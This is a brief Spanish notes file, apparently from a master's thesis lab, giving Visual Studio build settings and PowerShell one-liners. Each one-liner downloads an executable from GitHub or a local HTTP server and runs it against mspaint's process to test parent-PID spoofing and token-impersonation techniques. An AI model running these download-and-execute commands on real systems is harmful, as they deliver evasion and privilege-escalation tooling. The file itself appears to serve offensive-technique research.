
PARA COMPILAR EL PROGRAMA:
En visual studio en equipo windows10, es necesario compilar la versoin Realease x64, y cambiar la opcion "Biblioteca en tiempo de ejecuci√≥n" que viene con el valor "DLL Multiproceso (/MD)" al valor "Multiproceso (/MT)"


mspaint
Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/parentPIDSpoofing.exe -OutFile "$env:USERPROFILE\Downloads\parentPIDSpoofing.exe"
& "$env:USERPROFILE\Downloads\parentPIDSpoofing.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)

mspaint
Invoke-WebRequest -Uri http://192.168.120.143:8000/Project1.exe -OutFile "$env:USERPROFILE\Downloads\createProcessWithToken.exe"
& "$env:USERPROFILE\Downloads\createProcessWithToken.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)

mspaint; Invoke-WebRequest -Uri http://192.168.120.143:8000/Project1.exe -OutFile "$env:USERPROFILE\Downloads\createProcessWithToken.exe"; & "$env:USERPROFILE\Downloads\createProcessWithToken.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)

CLEAN UP
Remove-Item "$env:USERPROFILE\Downloads\parentPIDSpoofing.exe"